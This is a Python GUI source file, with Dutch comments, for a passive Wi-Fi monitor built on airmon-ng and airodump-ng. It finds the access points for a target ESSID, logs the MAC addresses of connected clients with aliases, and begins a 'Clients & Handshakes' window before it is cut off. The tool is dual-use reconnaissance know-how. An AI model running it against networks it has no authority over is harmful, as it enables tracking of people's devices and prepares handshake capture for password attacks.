import tkinter as tk
from tkinter import messagebox, ttk, simpledialog
import subprocess
import threading
import time
import os
import csv
import re
import shutil
import glob
import sys
import json
import signal
from datetime import datetime
from queue import Queue

# ---------------- Helpers (general) ----------------
def clean_text(s: str) -> str:
    """Verwijder niet-printbare/unicode-control chars uit logregels/GUI-strings."""
    if s is None:
        return ""
    s = s.replace("\r", "").replace("\t", "    ")
    return "".join(ch for ch in s if ch.isprintable() or ch in "\n ")

def safe_prefix(name: str) -> str:
    """Maak veilige bestands-/mapnaam."""
    s = re.sub(r'[^A-Za-z0-9._-]+', '_', name or "").strip('_')
    return s[:40] if s else "capture"

def parse_channel(raw: str):
    raw = (raw or "").strip()
    if raw in ("", "-1"):
        return None
    try:
        return int(float(raw.split()[0]))
    except Exception:
        return None

def channel_to_band(ch):
    """Map kanaal (of freq in MHz) naar band string (2.4/5/6)."""
    if ch is None:
        return None
    try:
        ch_i = int(ch)
    except Exception:
        return None
    # freq ranges
    if 2401 <= ch_i <= 2484:  # 2.4 GHz MHz
        return "2.4"
    if 4900 <= ch_i <= 5895:  # 5 GHz MHz
        return "5"
    if 5925 <= ch_i <= 7125:  # 6 GHz MHz
        return "6"
    # channel indexes (fallback)
    if ch_i <= 14:
        return "2.4"
    if 36 <= ch_i <= 165:
        return "5"
    if 1 <= ch_i <= 233:
        return "6"
    return None

def open_folder(path: str):
    """Open een folder in de OS bestandsverkenner (Linux/macOS/Windows)."""
    if not path:
        return False, "Pad ontbreekt"
    if not os.path.exists(path):
        return False, f"Bestand/map bestaat niet: {path}"
    try:
        if sys.platform.startswith("linux"):
            subprocess.run(["xdg-open", path], check=False)
        elif sys.platform == "darwin":
            subprocess.run(["open", path], check=False)
        elif sys.platform.startswith("win"):
            subprocess.run(["explorer", path], check=False)
        else:
            return False, f"Onbekend platform: {sys.platform}"
        return True, ""
    except Exception as e:
        return False, str(e)

def notify_user(title: str, body: str = ""):
    """Kleine desktopnotificatie (best effort)."""
    try:
        if sys.platform.startswith("linux") and shutil.which("notify-send"):
            subprocess.run(["notify-send", title, body], check=False)
        elif sys.platform == "darwin":
            osa = f'display notification "{body}" with title "{title}"'
            subprocess.run(["osascript", "-e", osa], check=False)
        # Windows: laat het stil; Tk-popup is al aanwezig indien nodig.
    except Exception:
        pass

# --------- File watcher (inotify of mtime) ---------
class FileWatcher:
    def __init__(self, path: str):
        self.path = path
        self._mtime = 0
        self._wd = None
        self._inotify = None
        try:
            from inotify_simple import INotify, flags
            self._inotify = INotify()
            d = os.path.dirname(path) or "."
            if os.path.isdir(d):
                self._wd = self._inotify.add_watch(
                    d, flags.MODIFY | flags.CLOSE_WRITE | flags.MOVED_TO | flags.CREATE
                )
        except Exception:
            self._inotify = None
        if os.path.exists(path):
            try:
                self._mtime = os.path.getmtime(path)
            except Exception:
                pass

    def changed(self, timeout_ms: int = 0) -> bool:
        # inotify path
        if self._inotify and self._wd is not None:
            try:
                events = self._inotify.read(timeout=timeout_ms)
                for ev in events:
                    name = getattr(ev, "name", None)
                    if name and os.path.basename(self.path) == name:
                        return True
            except BlockingIOError:
                pass
            except Exception:
                pass
        # mtime fallback
        try:
            if os.path.exists(self.path):
                m = os.path.getmtime(self.path)
                if m != self._mtime:
                    self._mtime = m
                    return True
        except Exception:
            pass
        return False

# ---------------- Main App ----------------
class WifiAutoTool:
    def __init__(self, master):
        self.master = master
        master.title("Wi-Fi Passive Monitor (ESSID + band filter)")

        # --------- Top form ---------
        top = ttk.Frame(master)
        top.pack(fill="x", padx=8, pady=6)

        ttk.Label(top, text="Wi-Fi interface (bv. wlan1):").grid(row=0, column=0, sticky="w")
        self.iface_entry = ttk.Entry(top, width=16)
        self.iface_entry.grid(row=0, column=1, sticky="w", padx=(4,12))

        ttk.Label(top, text="Monitor naam (bv. mon0):").grid(row=0, column=2, sticky="w")
        self.mon_name_entry = ttk.Entry(top, width=16)
        self.mon_name_entry.grid(row=0, column=3, sticky="w", padx=(4,12))

        ttk.Label(top, text="Band:").grid(row=0, column=4, sticky="w")
        self.band_var = tk.StringVar(value="5")
        ttk.Radiobutton(top, text="2.4 GHz", variable=self.band_var, value="2.4").grid(row=0, column=5, sticky="w")
        ttk.Radiobutton(top, text="5 GHz",   variable=self.band_var, value="5").grid(row=0, column=6, sticky="w")
        ttk.Radiobutton(top, text="6 GHz",   variable=self.band_var, value="6").grid(row=0, column=7, sticky="w")

        ttk.Label(top, text="ESSID:").grid(row=1, column=0, sticky="w")
        self.essid_entry = ttk.Entry(top, width=24)
        self.essid_entry.grid(row=1, column=1, columnspan=2, sticky="w", padx=(4,12))

        ttk.Label(top, text="Logniveau:").grid(row=1, column=3, sticky="w")
        self.log_var = tk.StringVar(value="verbose")
        ttk.Combobox(top, textvariable=self.log_var,
                     values=["basic","verbose","debug"], width=10, state="readonly")\
            .grid(row=1, column=4, sticky="w")

        # Nieuw: instelbare scan-tijden
        ttk.Label(top, text="Discovery (s):").grid(row=2, column=0, sticky="w")
        self.discovery_secs_var = tk.IntVar(value=25)
        ttk.Spinbox(top, from_=5, to=300, textvariable=self.discovery_secs_var, width=8)\
            .grid(row=2, column=1, sticky="w", padx=(4,12))

        ttk.Label(top, text="Per-BSSID scan (s):").grid(row=2, column=2, sticky="w")
        self.bssid_secs_var = tk.IntVar(value=60)
        ttk.Spinbox(top, from_=5, to=300, textvariable=self.bssid_secs_var, width=8)\
            .grid(row=2, column=3, sticky="w", padx=(4,12))

        self.start_button = ttk.Button(top, text="Start", command=self.start_process)
        self.start_button.grid(row=2, column=5, padx=(12,6))
        ttk.Button(top, text="STOP", command=self.kill_all).grid(row=2, column=6)

        # Extra bediening: Self-test & Dark mode
        ttk.Button(top, text="Self-test", command=self.open_selftest).grid(row=2, column=7, padx=(12,0))
        self.dark_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(top, text="Dark mode", variable=self.dark_var, command=self._apply_theme).grid(row=2, column=8, padx=(6,0))

        for i in range(9): top.grid_columnconfigure(i, weight=0)

        # --------- Discovery box ---------
        box1 = ttk.LabelFrame(master, text="Discovery (alle netwerken)")
        box1.pack(fill="both", expand=True, padx=8, pady=(0,6))

        # Filters (zoek + hide hidden)
        fbar = ttk.Frame(box1); fbar.pack(fill="x", padx=6, pady=(6,0))
        ttk.Label(fbar, text="Filter:").pack(side="left")
        self.search_var = tk.StringVar(value="")
        ent = ttk.Entry(fbar, textvariable=self.search_var, width=28)
        ent.pack(side="left", padx=(4,8))
        self.hide_hidden_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(fbar, text="Verberg hidden SSIDs", variable=self.hide_hidden_var,
                        command=self._apply_discovery_filter_and_render).pack(side="left", padx=(4,8))
        ttk.Button(fbar, text="Zoek", command=self._apply_discovery_filter_and_render).pack(side="left")

        # Discovery progress (indeterminate)
        self.discovery_prog = ttk.Progressbar(fbar, mode='indeterminate', length=140)
        self.discovery_prog.pack(side="right")

        cols = ("bssid","channel","band","essid")
        self.tree = ttk.Treeview(box1, columns=cols, show="headings", height=8)
        for c, w in zip(cols, (20,8,6,40)):
            self.tree.heading(c, text=c.upper())
            self.tree.column(c, width=w*8, anchor="w")
        self.tree.pack(fill="both", expand=True, padx=6, pady=6)

        # --------- Target + filtered BSSIDs ---------
        box2 = ttk.LabelFrame(master, text="Target & BSSID selectie (gefilterd op band)")
        box2.pack(fill="x", padx=8, pady=(0,6))

        self.target_label = ttk.Label(box2, text="Gezochte ESSID: —")
        self.target_label.pack(anchor="w", padx=6, pady=(6,2))

        ttk.Label(box2, text="BSSID’s op geselecteerde band:").pack(anchor="w", padx=6)
        self.bssid_list = tk.Listbox(box2, height=4)
        self.bssid_list.pack(fill="x", padx=6, pady=(0,6))

        # --------- Monitoring status ---------
        box3 = ttk.LabelFrame(master, text="Monitoring (per BSSID)")
        box3.pack(fill="x", padx=8, pady=(0,6))

        self.status_label = ttk.Label(box3, text="Status: —")
        self.status_label.pack(anchor="w", padx=6, pady=4)

        self.progress = ttk.Progressbar(box3, length=520, mode='determinate')
        self.progress.pack(fill="x", padx=6, pady=(0,6))

        ttk.Label(box3, text="Clients gezien (huidige BSSID):").pack(anchor="w", padx=6)
        self.clients_list = tk.Listbox(box3, height=6)
        self.clients_list.pack(fill="x", padx=6, pady=(0,8))

        # Skip-knoppen voor scans
        sk = ttk.Frame(box3); sk.pack(fill="x", padx=6, pady=(0,6))
        self.btn_skip_discovery = ttk.Button(sk, text="Discovery overslaan", command=self._skip_discovery, state=tk.DISABLED)
        self.btn_skip_discovery.pack(side="left")
        self.btn_skip_bssid = ttk.Button(sk, text="Volgende BSSID (skip)", command=self._skip_current_bssid, state=tk.DISABLED)
        self.btn_skip_bssid.pack(side="left", padx=(8,0))

        # Knop naar Client Center
        ttk.Button(box3, text="Clients & Handshakes…", command=self.open_client_center)\
            .pack(anchor="w", padx=6, pady=(0,6))

        # --------- Log output ---------
        box4 = ttk.LabelFrame(master, text="Log")
        box4.pack(fill="both", expand=True, padx=8, pady=(0,8))
        self.output_text = tk.Text(box4, height=12, width=110, font=("TkFixedFont", 9), wrap="none")
        self.output_text.pack(fill="both", expand=True, padx=6, pady=6)

        # Open logs-map
        ttk.Button(box4, text="Open logs-map", command=self.open_logs_dir)\
            .pack(anchor="e", padx=6, pady=(0,6))

        # ------------- State -------------
        self.running = False
        self.scan_proc = None
        self.mon_proc  = None
        self.logfile   = None
        self.logdir    = None

        # Extra state
        self.current_mon = None                # actuele monitor-interface
        self.all_clients = {}                  # (bssid, mac) -> info
        self.client_center = None              # verwijzing naar ClientCenter venster
        self.bssids = {}                       # bssid -> {"essid": str, "channel": int|str, "band": "2.4"|"5"|"6"}
        self.packets_var = tk.IntVar(value=5)  # UI value (1..128) voor later

        # Scans/skip
        self._discovery_skip = threading.Event()
        self._bssid_skip = threading.Event()
        self._in_discovery = False
        self._in_bssid_scan = False

        # Aliassen
        self.aliases = {}

        # Proces/PID tracking + systeem snapshots
        self.child_pids = set()
        self._nm_was_active = None
        self._iface_snapshot = None

        # Watchdog
        self.watchdog_secs = 20

        # Discovery data (voor filters)
        self.discovery_rows = []

        # Realtime client counter
        self.client_counts = {}

        # Central log queue (minder Tk after spam)
        self.log_queue = Queue()
        self._schedule_log_drain()

        # Thema: onthoud origineel
        try:
            self._orig_theme = ttk.Style().theme_use()
        except Exception:
            self._orig_theme = None

        # Theme
        self._apply_theme()

    # --------- Proc helpers ---------
    def _spawn(self, args, **kw):
        # log wat er gestart wordt (samengevat)
        self._enqueue_log(f"RUN: {' '.join(args)}", "debug")
        p = subprocess.Popen(args, **kw)
        try:
            self.child_pids.add(p.pid)
        except Exception:
            pass
        return p

    def _stop_proc(self, p, name="proc"):
        if not p:
            return
        try:
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    self._enqueue_log(f"{name}: SIGKILL", "debug")
                    p.kill()
        except Exception:
            pass

    def _terminate_children(self):
        for pid in list(self.child_pids):
            try:
                os.kill(pid, 15)
            except ProcessLookupError:
                pass
            except Exception:
                pass
            finally:
                try:
                    self.child_pids.discard(pid)
                except Exception:
                    pass

    def _nm_state(self):
        try:
            out = subprocess.check_output(["systemctl","is-active","NetworkManager"], text=True).strip()
            return out == "active"
        except Exception:
            return None

    def snapshot_iface(self, iface):
        info = {"name": iface, "type": None}
        try:
            out = subprocess.check_output(["iw","dev"], text=True, stderr=subprocess.STDOUT)
            cur = None
            for line in out.splitlines():
                line=line.strip()
                if line.startswith("Interface "):
                    cur = line.split()[1]
                elif cur == iface and line.startswith("type "):
                    info["type"] = line.split()[1]
                    break
        except Exception:
            pass
        return info

    def restore_iface(self, info):
        try:
            if info and info.get("name") and info.get("type"):
                subprocess.run(["ip","link","set",info["name"],"down"])
                subprocess.run(["iw",info["name"],"set","type",info["type"]])
                subprocess.run(["ip","link","set",info["name"],"up"])
        except Exception:
            pass

    def _set_channel_or_freq(self, dev, channel):
        """Robuust kanaal pinnen: eerst 'set channel', anders 6 GHz 'set freq'."""
        try:
            r = subprocess.run(["iw", dev, "set", "channel", str(channel)],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if r.returncode == 0:
                return
        except Exception:
            pass
        # fallback voor 6 GHz: center freq
        try:
            ch = int(channel)
            if 1 <= ch <= 233:
                freq = 5955 + 5 * (ch - 1)
                subprocess.run(["iw", dev, "set", "freq", str(freq)],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    # ---------------- Logging (queue) ----------------
    def _enqueue_log(self, msg, level="basic"):
        levels = {"basic":0,"verbose":1,"debug":2}
        if levels[level] <= levels[self.log_var.get()]:
            stamp = datetime.now().strftime("%H:%M:%S")
            line = clean_text(f"[{stamp}] {msg}")
            self.log_queue.put(line)
            # file
            if self.logfile:
                try:
                    self.logfile.write(line + "\n")
                    self.logfile.flush()
                except Exception:
                    pass

    def _schedule_log_drain(self):
        def drain():
            try:
                while True:
                    line = self.log_queue.get_nowait()
                    try:
                        self.output_text.insert(tk.END, line + "\n")
                        self.output_text.see(tk.END)
                        print(line)
                    except Exception:
                        pass
            except Exception:
                pass
            finally:
                self.master.after(80, self._schedule_log_drain)  # zachte frequentie
        drain()

    # Compat: oude log() API
    def log(self, msg, level="basic"):
        self._enqueue_log(msg, level)

    def preflight_or_die(self):
        if os.geteuid() != 0:
            messagebox.showerror("Rechten", "Start dit script als root (bijv. met: sudo -s).")
            return False
        for bin in ("airodump-ng","airmon-ng","ip","iw","systemctl","hcxpcapngtool"):
            if shutil.which(bin) is None:
                messagebox.showerror("Ontbrekend", f"Benodigde tool ontbreekt: {bin}")
                return False
        return True

    def ensure_monitor(self, iface, mon):
        subprocess.run(["ip","link","set",iface,"down"])
        subprocess.run(["iw",iface,"set","type","monitor"])
        subprocess.run(["ip","link","set",iface,"up"])
        if mon != iface:
            exists = subprocess.run(["ip","link","show",mon],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
            if not exists:
                subprocess.run(["ip","link","set",iface,"name",mon])
                return mon
            else:
                return iface
        return mon

    def list_interfaces_log(self):
        try:
            out = subprocess.check_output(["iw","dev"], text=True, stderr=subprocess.STDOUT)
            self.log("iw dev:\n"+clean_text(out), "debug")
        except Exception as e:
            self.log(f"iw dev error: {e}", "debug")
        try:
            out = subprocess.check_output(["ip","link","show"], text=True, stderr=subprocess.STDOUT)
            self.log("ip link show:\n"+clean_text(out), "debug")
        except Exception as e:
            self.log(f"ip link error: {e}", "debug")

    def run_with_timeout(self, cmd, timeout_sec):
        try:
            p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               text=True, timeout=timeout_sec, check=False)
            self.log(f"CMD exitcode: {p.returncode}", "debug")
            if p.stdout:
                head = "\n".join(p.stdout.splitlines()[:10])
                if head.strip():
                    self.log(f"CMD output (head):\n{clean_text(head)}", "verbose")
            return p.returncode, p.stdout or ""
        except subprocess.TimeoutExpired as e:
            self.log(f"CMD timeout na {timeout_sec}s → kill: {' '.join(cmd)}", "basic")
            return 124, e.output or ""

    def _open_log(self, path):
        """Eenvoudige logrotatie."""
        try:
            if os.path.exists(path) and os.path.getsize(path) > 5*1024*1024:
                shutil.move(path, path + "." + datetime.now().strftime("%Y%m%d%H%M%S"))
        except Exception:
            pass
        return open(path, "a", encoding="utf-8")

    # ---------------- Aliassen ----------------
    def _aliases_path(self):
        return os.path.join(self.logdir or "logs", "aliases.json")

    def load_aliases(self):
        try:
            path = self._aliases_path()
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8") as f:
                    self.aliases = json.load(f)
            else:
                self.aliases = {}
        except Exception:
            self.aliases = {}

    def save_aliases(self):
        try:
            os.makedirs(self.logdir or "logs", exist_ok=True)
            with open(self._aliases_path(), "w", encoding="utf-8") as f:
                json.dump(self.aliases, f, ensure_ascii=False, indent=2)
        except Exception as e:
            self.log(f"Kon aliases niet opslaan: {e}", "basic")

    def alias_for(self, mac: str) -> str:
        mac = (mac or "").strip().lower()
        name = self.aliases.get(mac)
        return f"{name} ({mac})" if name else mac

    def set_alias(self, mac: str, name: str):
        mac = (mac or "").strip().lower()
        name = (name or "").strip()
        if not mac:
            return
        if name:
            self.aliases[mac] = name
        else:
            self.aliases.pop(mac, None)
        self.save_aliases()
        self.save_session()  # sessie bijwerken als namen wijzigen

    # ---------------- Session (save/load) ----------------
    def _session_path(self):
        return os.path.join(self.logdir or "logs", "session.json")

    def load_session(self):
        try:
            p = self._session_path()
            if os.path.exists(p):
                with open(p, "r", encoding="utf-8") as f:
                    data = json.load(f)
                self.bssids.update(data.get("bssids", {}))
                self.all_clients.update({tuple(k.split("|",1)): v for k,v in data.get("all_clients", {}).items()})
                self.client_counts.update(data.get("client_counts", {}))
        except Exception as e:
            self.log(f"Session load error: {e}", "debug")

    def save_session(self):
        try:
            os.makedirs(self.logdir or "logs", exist_ok=True)
            p = self._session_path()
            data = {
                "bssids": self.bssids,
                "all_clients": {"|".join(k): v for k,v in self.all_clients.items()},
                "client_counts": self.client_counts
            }
            with open(p, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            self.log(f"Session save error: {e}", "debug")

    # ---------------- Controls ----------------
    def start_process(self):
        if not self.preflight_or_die():
            return
        iface = self.iface_entry.get().strip()
        mon   = self.mon_name_entry.get().strip()
        band  = self.band_var.get()
        essid = self.essid_entry.get().strip()
        if not iface or not mon or not essid:
            messagebox.showerror("Fout", "Vul interface, monitornaam en ESSID in.")
            return

        safe_essid = safe_prefix(essid)
        self.logdir = os.path.join("logs", safe_essid)
        os.makedirs(self.logdir, exist_ok=True)
        self.logfile = self._open_log(os.path.join(self.logdir, "session.log"))

        self.load_aliases()
        self.load_session()

        # reset UI
        for i in self.tree.get_children(): self.tree.delete(i)
        self.bssid_list.delete(0, tk.END)
        self.clients_list.delete(0, tk.END)
        self.target_label.config(text=f"Gezochte ESSID: {essid} (band {band})")
        self.status_label.config(text="Status: —")
        self.progress['value'] = 0

        # snapshot states
        self._nm_was_active = self._nm_state()
        self._iface_snapshot = self.snapshot_iface(iface)

        self.running = True
        self.start_button.config(state=tk.DISABLED)
        threading.Thread(target=self.run_pipeline, args=(iface, mon, band, essid), daemon=True).start()

    def kill_all(self):
        self.running = False
        self._discovery_skip.set()
        self._bssid_skip.set()
        self.log("STOP ingedrukt: processen beëindigen…", "basic")
        for proc in (self.scan_proc, self.mon_proc):
            self._stop_proc(proc, "airodump")
        self._terminate_children()
        # Herstel NM indien eerder actief
        if self._nm_was_active is True:
            subprocess.run(["systemctl","start","NetworkManager"])
        # Herstel interface mode
        self.restore_iface(self._iface_snapshot)

        self.progress['value'] = 0
        self.start_button.config(state=tk.NORMAL)
        if self.logfile:
            try:
                self.logfile.close()
            except Exception:
                pass
            self.logfile = None
        self.btn_skip_discovery.config(state=tk.DISABLED)
        self.btn_skip_bssid.config(state=tk.DISABLED)

    def open_logs_dir(self):
        if not self.logdir:
            messagebox.showinfo("Logs", "Nog geen logs-map. Start eerst een sessie.")
            return
        ok, err = open_folder(self.logdir)
        if not ok:
            messagebox.showerror("Open map", f"Kon map niet openen:\n{err}")

    # Skip handlers
    def _skip_discovery(self):
        if self._in_discovery:
            self._discovery_skip.set()
            self.log("Discovery: skip aangevraagd.", "basic")
            self._stop_proc(self.scan_proc, "airodump(discovery)")

    def _skip_current_bssid(self):
        if self._in_bssid_scan:
            self._bssid_skip.set()
            self.log("Per-BSSID scan: skip aangevraagd.", "basic")

    # ---------------- Pipeline ----------------
    def run_pipeline(self, iface, mon, band, essid):
        try:
            self.log("airmon-ng check kill…","basic")
            subprocess.run(["airmon-ng","check","kill"],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.log(f"{iface} → monitor mode ({mon})…","basic")
            mon_name = self.ensure_monitor(iface, mon)
            self.current_mon = mon_name
            self.list_interfaces_log()

            # ---------- Discovery ----------
            band_map = {"2.4": "bg", "5": "a", "6": "6", "all": "abg6"}
            band_flag = band_map.get(band, "a")
            prefix = os.path.join(self.logdir, "discovery")
            for suf in ("-01.csv","-01.cap","-01.kismet.csv","-01.kismet.netxml"):
                try: os.remove(prefix + suf)
                except FileNotFoundError: pass

            self._discovery_skip.clear()
            self._in_discovery = True
            self.btn_skip_discovery.config(state=tk.NORMAL)
            secs = max(5, int(self.discovery_secs_var.get() or 25))

            self.log(f"Discovery scan ~{secs}s op band {band} (--band {band_flag})…","basic")
            self.status_label.config(text=f"Status: Discovery op band {band}… (⏳ {secs}s)")
            disco_cmd = ["airodump-ng","--band",band_flag,"--write",prefix,"--output-format","csv", mon_name]
            self.scan_proc = self._spawn(disco_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

            # start indeterminate bar
            try: self.discovery_prog.start(50)
            except Exception: pass

            start = time.time()
            last_out = time.time()
            watchdog = self.watchdog_secs

            while self.running and (time.time() - start) < secs and not self._discovery_skip.is_set():
                try:
                    if self.scan_proc.stdout:
                        ln = self.scan_proc.stdout.readline()
                        if ln and ln.strip():
                            self.log(clean_text(ln.strip()), "debug")
                            last_out = time.time()
                except Exception:
                    pass

                # Watchdog: herstart als stilgevallen
                if self.scan_proc and self.scan_proc.poll() is None and (time.time() - last_out) > watchdog:
                    self.log("Discovery watchdog: geen output, herstart airodump…", "basic")
                    self._stop_proc(self.scan_proc, "airodump(discovery)")
                    self.scan_proc = self._spawn(disco_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
                    last_out = time.time()

                remaining = secs - int(time.time() - start)
                self.master.after(0, lambda r=remaining: self.status_label.config(text=f"Status: Discovery op band {band}… (⏳ {max(0,r)}s)"))
                time.sleep(0.2)

            self._stop_proc(self.scan_proc, "airodump(discovery)")
            self.scan_proc = None
            self._in_discovery = False
            self.btn_skip_discovery.config(state=tk.DISABLED)
            try: self.discovery_prog.stop()
            except Exception: pass

            if not self.running:
                self.progress['value'] = 0
                return
            csv_path = prefix + "-01.csv"
            if not os.path.exists(csv_path):
                self.log("Discovery: geen CSV gecreëerd.", "basic")
                self.status_label.config(text="Status: geen discovery CSV")
                self.progress['value'] = 0
                return

            # Discovery naar tabel (bewaar ruwe lijst en render met filters)
            self.discovery_rows = self.read_discovery(csv_path)
            self._apply_discovery_filter_and_render()
            self.log(f"Discovery gevonden netwerken: {len(self.discovery_rows)}", "basic")

            # BSSID-info opslaan (alleen voor gekozen ESSID+band)
            self.bssids.clear()
            for (bssid, ch, bandx, essx) in self.discovery_rows:
                if essx == essid and bandx == band:
                    self.bssids[bssid] = {"essid": essx, "channel": ch, "band": bandx}

            self.bssid_list.delete(0, tk.END)
            for bssid, meta in self.bssids.items():
                self.bssid_list.insert(tk.END, f"{bssid}  (ch {meta['channel']})")

            if not self.bssids:
                self.log(f"Geen BSSID’s voor ESSID '{essid}' op band {band}.", "basic")
                self.status_label.config(text="Status: geen passende BSSID’s")
                self.progress['value'] = 0
                return

            # ---------- Per-BSSID scan voor clients ----------
            secs_bssid = max(5, int(self.bssid_secs_var.get() or 60))
            self._in_bssid_scan = True
            self.btn_skip_bssid.config(state=tk.NORMAL)

            for idx,(bssid, meta) in enumerate(self.bssids.items(), start=1):
                if not self.running: break
                ch = meta["channel"]
                self._bssid_skip.clear()
                self.status_label.config(text=f"Status: BSSID {idx}/{len(self.bssids)} → {bssid} (ch {ch}) (⏳ {secs_bssid}s)")
                self.clients_list.delete(0, tk.END)
                self.monitor_one_bssid(mon_name, bssid, ch, essid, wait_seconds=secs_bssid)
                if self._bssid_skip.is_set():
                    self.log(f"Skip → volgende BSSID (na {bssid}).", "basic")
                    continue

            self.btn_skip_bssid.config(state=tk.DISABLED)
            self._in_bssid_scan = False

            self.log("Klaar. NetworkManager herstarten…","basic")
            if self._nm_was_active is True:
                subprocess.run(["systemctl","start","NetworkManager"])
            self.status_label.config(text="Status: klaar")

        finally:
            self.running = False
            self.progress['value'] = 0
            self.start_button.config(state=tk.NORMAL)
            if self.logfile:
                try:
                    self.logfile.close()
                except Exception:
                    pass
                self.logfile = None
            self.btn_skip_discovery.config(state=tk.DISABLED)
            self.btn_skip_bssid.config(state=tk.DISABLED)
            self.restore_iface(self._iface_snapshot)
            self._terminate_children()
            self.save_session()

    # ---------------- Discovery filters/render ----------------
    def _is_hidden_essid(self, ess: str) -> bool:
        if not ess or ess.strip() == "":
            return True
        low = ess.strip().lower()
        return low.startswith("<length") or low in ("hidden", "<hidden>")

    def _apply_discovery_filter_and_render(self):
        try:
            for i in self.tree.get_children(): self.tree.delete(i)
            q = (self.search_var.get() or "").strip().lower()
            hide = self.hide_hidden_var.get()
            rows = []
            for (bssid,ch,band,ess) in self.discovery_rows:
                if hide and self._is_hidden_essid(ess):
                    continue
                if q and (q not in (ess or "").lower()) and (q not in bssid.lower()):
                    continue
                rows.append((bssid,ch,band,ess))
            for row in rows[:500]:
                self.tree.insert("", "end", values=row)
        except Exception as e:
            self.log(f"Filter/render error: {e}", "debug")

    # ---------------- CSV parsing & monitoring ----------------
    def read_discovery(self, csv_path):
        """Geef lijst terug van (BSSID, channel, band, ESSID) uit discovery CSV."""
        items = []
        try:
            with open(csv_path, newline='', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                in_aps = False
                idx = {}
                for row in reader:
                    if not row:
                        in_aps = False
                        continue
                    first = (row[0] or "").strip().lower()
                    if first.startswith("bssid"):
                        in_aps = True
                        idx = {name.strip().lower(): i for i, name in enumerate(row)}
                        continue
                    if in_aps:
                        def col(name, default=""):
                            i = idx.get(name)
                            return row[i].strip() if (i is not None and i < len(row)) else default
                        bssid = col("bssid")
                        if not bssid:
                            continue
                        ch_raw = col("channel")
                        ess    = clean_text(col("essid"))
                        ch = parse_channel(ch_raw)
                        band = channel_to_band(ch)
                        items.append((bssid, str(ch) if ch is not None else "?", band or "?", ess))
        except Exception as e:
            self.log(f"Discovery parse error: {e}", "debug")
        return items

    def register_client(self, bssid, channel, essid, mac):
        """Houd een globale lijst bij voor het Client Center (met alias-rendering)."""
        key = (bssid, mac)
        now = datetime.now().strftime("%H:%M:%S")
        self.all_clients[key] = {
            "bssid": bssid,
            "mac": mac,
            "channel": channel,
            "essid": essid,
            "last_seen": now
        }
        # realtime counter
        self.client_counts[bssid] = self.client_counts.get(bssid, 0) + 1
        # update ClientCenter indien open
        if self.client_center is not None:
            try:
                self.client_center.update_row_from_client(self.all_clients[key])
            except Exception:
                pass
        self.save_session()

    def monitor_one_bssid(self, mon, bssid, channel, essid, wait_seconds=60):
        """Passief: Xs op kanaal luisteren, clients loggen en in lijst tonen (skip-aware)."""
        prefix = os.path.join(self.logdir, safe_prefix(f"{essid}_mon"))
        for suf in ("-01.csv","-01.cap","-01.kismet.csv","-01.kismet.netxml"):
            try: os.remove(prefix + suf)
            except FileNotFoundError: pass

        # kanaal/freq pin
        if channel not in (None, "?", "", "-1"):
            self._set_channel_or_freq(self.current_mon, channel)
            time.sleep(0.15)  # korte stabilisatie

        cmd = ["airodump-ng","--bssid", bssid, "--channel", str(channel),
               "--write", prefix, "--output-format","csv", mon]
        self.mon_proc = self._spawn(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1)

        start = time.time()
        self.progress['maximum'] = wait_seconds
        csv_capture = prefix + "-01.csv"
        seen_clients = set()
        watcher = FileWatcher(csv_capture)
        last_out = time.time()
        watchdog = self.watchdog_secs

        while self.running and (time.time() - start) < wait_seconds and not self._bssid_skip.is_set():
            elapsed = int(time.time() - start)
            self.master.after(0, lambda e=elapsed: self.progress.config(value=e))

            try:
                if self.mon_proc.stdout:
                    line = self.mon_proc.stdout.readline()
                    if line and line.strip():
                        self.log(clean_text(line.strip()), "verbose")
                        last_out = time.time()
            except Exception:
                pass

            # Watchdog: herstart als stilgevallen
            if self.mon_proc and self.mon_proc.poll() is None and (time.time() - last_out) > watchdog:
                self.log("Per-BSSID watchdog: geen output, herstart airodump…", "basic")
                self._stop_proc(self.mon_proc, "airodump(per-bssid)")
                self.mon_proc = self._spawn(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                            text=True, bufsize=1)
                last_out = time.time()

            if os.path.exists(csv_capture) and watcher.changed(0):
                try:
                    with open(csv_capture, newline='', encoding='utf-8', errors='ignore') as f:
                        reader = csv.reader(f)
                        in_clients = False
                        for row in reader:
                            if not row:
                                in_clients = False
                                continue
                            cell0 = (row[0] or "").strip().lower()
                            if cell0.startswith("station mac"):
                                in_clients = True
                                continue
                            if in_clients and (row[0] or "").strip():
                                mac = (row[0] or "").strip()
                                mac = clean_text(mac)
                                if mac and mac not in seen_clients:
                                    seen_clients.add(mac)
                                    self.master.after(0, lambda m=mac: self.clients_list.insert(tk.END, self.alias_for(m)))
                                    self.register_client(bssid, channel, essid, mac)
                except Exception as e:
                    self.log(f"CSV read error: {e}", "debug")

            time.sleep(0.2)

        self._stop_proc(self.mon_proc, "airodump(per-bssid)")
        self.mon_proc = None
        self.progress['value'] = 0

    # ---------------- Client Center ----------------
    def open_client_center(self):
        if self.client_center is None or not tk.Toplevel.winfo_exists(self.client_center.win):
            self.client_center = self.ClientCenter(self)
        else:
            self.client_center.win.lift()

    class ClientCenter:
        def __init__(self, app: "WifiAutoTool"):
            self.app = app
            self.win = tk.Toplevel(app.master)
            self.win.title("Clients & Handshakes")
            self.win.geometry("1160x680")

            root = ttk.Frame(self.win); root.pack(fill="both", expand=True, padx=8, pady=8)

            # --- Linkerpaneel: AP's (BSSID) ---
            left = ttk.LabelFrame(root, text="Access Points (BSSID)")
            left.pack(side="left", fill="both", expand=True, padx=(0,6))

            ap_cols = ("bssid","essid","channel","band","clients")
